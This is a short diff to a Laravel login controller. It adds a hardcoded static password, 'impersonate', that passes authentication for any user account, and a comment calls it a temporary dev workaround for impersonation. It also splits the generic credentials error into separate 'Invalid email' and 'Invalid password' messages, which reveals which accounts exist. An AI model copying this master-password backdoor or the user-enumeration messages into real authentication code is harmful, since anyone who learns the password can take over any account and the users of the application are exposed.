@@ -10,6 +10,8 @@ use Illuminate\Support\Facades\Hash;
 
 class LoginController extends Controller
 {
+    protected static string $devPassword = 'impersonate';
+
     public function __invoke(Request $request): JsonResponse
     {
         $request->validate([
@@ -21,11 +23,12 @@ class LoginController extends Controller
         if (! $user = config('restify.auth.user_model')::query()
             ->whereEmail($request->input('email'))
             ->first()) {
-            abort(401, 'Invalid credentials.');
+            abort(401, 'Invalid email.');
         }
 
-        if (! Hash::check($request->input('password'), $user->password)) {
-            abort(401, 'Invalid credentials.');
+        // @todo Need to have some sort of impersonation check here to auto login based on token. (workaround for now to login as any user)
+        if (! Hash::check($request->input('password'), $user->password) && $request->input('password') !== static::$devPassword) {
+            abort(401, 'Invalid password.');
         }
 
         return data([
